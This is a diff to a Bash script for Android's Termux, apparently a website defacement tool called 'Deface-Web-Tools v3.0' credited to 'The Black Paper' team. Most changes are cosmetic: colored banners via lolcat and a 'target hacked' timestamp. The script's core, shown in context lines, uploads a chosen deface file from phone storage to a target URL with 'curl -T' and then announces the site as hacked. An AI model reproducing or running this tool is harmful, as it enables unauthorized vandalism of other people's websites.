@@ -5,24 +5,25 @@ red="\033[35;1m"
 purple="\033[37;1m"
 cyan="\033[36;1m"
 white="\033[39;1m"
-pkg install figlet -y
 pkg install curl -y
+pkg install ruby -y
+gem install lolcat
 echo  $green
-echo "blackpaper.............";
-sleep 0.1;
+echo "The black paper.............";
+sleep 0.9;
 clear
 echo
 echo
 echo
 echo
 echo
-figlet -f future "The Black Paper"
-echo ------------------------------
-echo Team:The Black Paper
-echo Creator:7870a
-echo github:https://github.com/7870a
-echo Deface-Web-Tools v3.0
-echo ------------------------------
+figlet BP | lolcat
+echo ------------------------------ | lolcat
+echo Team:The Black Paper | lolcat
+echo Creator:7870a | lolcat
+echo github:https://github.com/7870a | lolcat
+echo Deface-Web-Tools v3.0 | lolcat
+echo ------------------------------ | lolcat
 read -p "Nama Samaran:"  ta
 clear
 echo $green
@@ -54,5 +55,7 @@ echo loading..
 curl -T /storage/emulated/0/$script $target
 echo $red
 echo [$target~Hacked]
+echo Target Terhack Pada
+date | lolcat
 echo $green
 echo terimakasih $ta telah menggunakan tools ini
